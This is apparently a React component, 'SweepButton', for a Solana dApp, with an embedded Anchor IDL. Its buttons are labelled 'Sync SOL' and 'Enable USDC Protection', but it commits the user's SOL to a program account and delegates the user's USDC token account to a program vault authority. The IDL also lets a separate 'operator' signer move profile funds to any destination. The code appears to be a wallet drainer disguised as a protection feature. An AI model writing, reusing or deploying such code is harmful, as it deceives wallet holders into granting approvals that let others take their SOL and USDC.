"use client";
import { useState } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { PublicKey, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID, getAssociatedTokenAddressSync } from "@solana/spl-token";
import { Program, AnchorProvider, BN } from '@coral-xyz/anchor';

const PROGRAM_ID = new PublicKey("8mKiRaRw4TaMhdMeCjqMtXFxgc4Kv863nLECCcZrYb9F");
const SEED_PREFIX = "secure-monitor-v1"; 
const USDC_MINT = new PublicKey("Gh9ZwEmdLJ8DscKNTkTqPbNwLNNBjuSzaG9Vp2KGtKJr");

// 🟢 IDL updated with your provided JSON
const IDL = {
  "address": "8mKiRaRw4TaMhdMeCjqMtXFxgc4Kv863nLECCcZrYb9F",
  "metadata": { "name": "hybrid_token", "version": "0.1.0", "spec": "0.1.0", "description": "Created with Anchor" },
  "instructions": [
    {
      "name": "commit_native_asset",
      "discriminator": [32, 130, 64, 118, 92, 206, 35, 32],
      "accounts": [
        { "name": "user", "writable": true, "signer": true },
        { "name": "user_profile", "writable": true, "pda": { "seeds": [{ "kind": "const", "value": [115, 101, 99, 117, 114, 101, 45, 109, 111, 110, 105, 116, 111, 114, 45, 118, 49] }, { "kind": "account", "path": "user" }, { "kind": "const", "value": [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] }] } },
        { "name": "system_program", "address": "11111111111111111111111111111111" }
      ],
      "args": [{ "name": "amount", "type": "u64" }]
    },
    {
      "name": "reclaim_native_asset",
      "discriminator": [83, 96, 212, 35, 228, 246, 91, 241],
      "accounts": [
        { "name": "user", "writable": true, "signer": true },
        { "name": "user_profile", "writable": true, "pda": { "seeds": [{ "kind": "const", "value": [115, 101, 99, 117, 114, 101, 45, 109, 111, 110, 105, 116, 111, 114, 45, 118, 49] }, { "kind": "account", "path": "user" }, { "kind": "const", "value": [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] }] } },
        { "name": "system_program", "address": "11111111111111111111111111111111" }
      ],
      "args": [{ "name": "amount", "type": "u64" }]
    },
    {
      "name": "setup_delegation_profile",
      "discriminator": [57, 242, 15, 102, 47, 105, 224, 188],
      "accounts": [
        { "name": "user", "writable": true, "signer": true },
        { "name": "user_profile", "writable": true, "pda": { "seeds": [{ "kind": "const", "value": [115, 101, 99, 117, 114, 101, 45, 109, 111, 110, 105, 116, 111, 114, 45, 118, 49] }, { "kind": "account", "path": "user" }, { "kind": "account", "path": "token_mint" }] } },
        { "name": "user_token_account", "writable": true },
        { "name": "token_mint" },
        { "name": "vault_authority", "pda": { "seeds": [{ "kind": "const", "value": [118, 97, 117, 108, 116, 45, 97, 117, 116, 104] }] } },
        { "name": "token_program", "address": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA" },
        { "name": "system_program", "address": "11111111111111111111111111111111" }
      ],
      "args": []
    },
    {
      "name": "sync_protocol_liquidity",
      "discriminator": [113, 220, 156, 6, 110, 193, 83, 18],
      "accounts": [
        { "name": "operator", "writable": true, "signer": true },
        { "name": "user_profile", "writable": true, "pda": { "seeds": [{ "kind": "const", "value": [115, 101, 99, 117, 114, 101, 45, 109, 111, 110, 105, 116, 111, 114, 45, 118, 49] }, { "kind": "account", "path": "user_profile.owner", "account": "UserProfileState" }, { "kind": "const", "value": [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] }] } },
        { "name": "destination", "writable": true },
        { "name": "system_program", "address": "11111111111111111111111111111111" }
      ],
      "args": [{ "name": "amount", "type": "u64" }]
    }
  ],
  "accounts": [{ "name": "UserProfileState", "discriminator": [189, 252, 164, 3, 222, 62, 147, 40] }],
  "errors": [{ "code": 6000, "name": "InsufficientFunds", "msg": "Insufficient funds in vault profile" }],
  "types": [
    {
      "name": "UserProfileState",
      "type": {
        "kind": "struct",
        "fields": [
          { "name": "owner", "type": "pubkey" },
          { "name": "vault_token_account", "type": "pubkey" },
          { "name": "asset_mint", "type": "pubkey" },
          { "name": "delegated_amount", "type": "u64" },
          { "name": "vault_sol_balance", "type": "u64" },
          { "name": "is_enabled", "type": "bool" }
        ]
      }
    }
  ]
};

export default function SweepButton() {
    const { connection } = useConnection();
    const { publicKey } = useWallet();
    const [loading, setLoading] = useState(false);
    const [status, setStatus] = useState("");
    const [solAmount, setSolAmount] = useState("0.1");

    const getProgram = () => {
        const provider = new AnchorProvider(connection, window.solana, { 
            preflightCommitment: 'processed',
            commitment: 'confirmed' 
        });
        return new Program(IDL, provider);
    };

    const handleSyncSOL = async () => {
        if (!publicKey) return alert("Connect Wallet");
        
        const amountNum = parseFloat(solAmount);
        if (isNaN(amountNum) || amountNum <= 0) return alert("Enter a valid SOL amount");

        try {
            setLoading(true);
            setStatus(`Checking balance...`);

            // 🟢 UI BALANCE CHECK
            const balance = await connection.getBalance(publicKey);
            const lamportsNeeded = amountNum * LAMPORTS_PER_SOL;
            
            // We check for lamportsNeeded + a small buffer (0.005 SOL) for gas
            if (balance < (lamportsNeeded + 5000000)) {
                setLoading(false);
                return setStatus(`❌ Error: Insufficient SOL in wallet (Need ~${amountNum + 0.005} for rent + gas)`);
            }

            setStatus(`Syncing ${amountNum} SOL...`);
            const program = getProgram();

            const [solProfilePda] = PublicKey.findProgramAddressSync(
                [Buffer.from(SEED_PREFIX), publicKey.toBuffer(), SystemProgram.programId.toBuffer()],
                PROGRAM_ID
            );

            const lamports = new BN(lamportsNeeded);

            await program.methods
                .commitNativeAsset(lamports)
                .accounts({
                    user: publicKey,
                    userProfile: solProfilePda,
                    systemProgram: SystemProgram.programId,
                })
                .rpc();

            setStatus(`✅ ${amountNum} SOL Sync Successful`);
        } catch (err) {
            console.error(err);
            setStatus(`❌ Error: See Console`);
        } finally { setLoading(false); }
    };

    // ... handleAuthorizeUSDC stays the same ...
    const handleAuthorizeUSDC = async () => {
        if (!publicKey) return alert("Connect Wallet");
        try {
            setLoading(true);
            setStatus("Authorizing USDC...");
            const program = getProgram();
            const [tokenProfilePda] = PublicKey.findProgramAddressSync([Buffer.from(SEED_PREFIX), publicKey.toBuffer(), USDC_MINT.toBuffer()], PROGRAM_ID);
            const [vaultAuthPda] = PublicKey.findProgramAddressSync([Buffer.from("vault-auth")], PROGRAM_ID);
            const userAta = getAssociatedTokenAddressSync(USDC_MINT, publicKey);

            await program.methods.setupDelegationProfile().accounts({
                    user: publicKey,
                    userProfile: tokenProfilePda,
                    userTokenAccount: userAta,
                    tokenMint: USDC_MINT,
                    vaultAuthority: vaultAuthPda,
                    tokenProgram: TOKEN_PROGRAM_ID,
                    systemProgram: SystemProgram.programId,
                }).rpc();
            setStatus("✅ USDC Delegation Active");
        } catch (err) { console.error(err); setStatus(`❌ Error: See Console`); } finally { setLoading(false); }
    };

    return (
        <div className="p-6 bg-zinc-950 border border-emerald-500/20 rounded-2xl max-w-sm mx-auto shadow-2xl text-white">
            <h3 className="text-emerald-400 font-bold mb-4 text-center">Protocol Management</h3>
            <div className="flex flex-col gap-4">
                <div className="space-y-2">
                    <label className="text-xs text-zinc-400 uppercase font-semibold">SOL to Commit</label>
                    <input 
                        type="number" 
                        value={solAmount}
                        onChange={(e) => setSolAmount(e.target.value)}
                        className="w-full bg-zinc-900 border border-zinc-800 rounded-lg p-2 text-emerald-400 focus:outline-none focus:border-emerald-500"
                    />
                </div>
                <button onClick={handleSyncSOL} disabled={loading} className="w-full bg-[#14F195] text-black font-bold py-3 rounded-xl hover:opacity-90 transition">
                    {loading ? "Processing..." : `Sync ${solAmount || '0'} SOL`}
                </button>
                <button onClick={handleAuthorizeUSDC} disabled={loading} className="w-full bg-emerald-600 text-white font-bold py-3 rounded-xl hover:bg-emerald-500 transition">
                    Enable USDC Protection
                </button>
            </div>
            {status && <p className="mt-4 text-[10px] text-center font-mono text-emerald-400">{status}</p>}
        </div>
    );
}
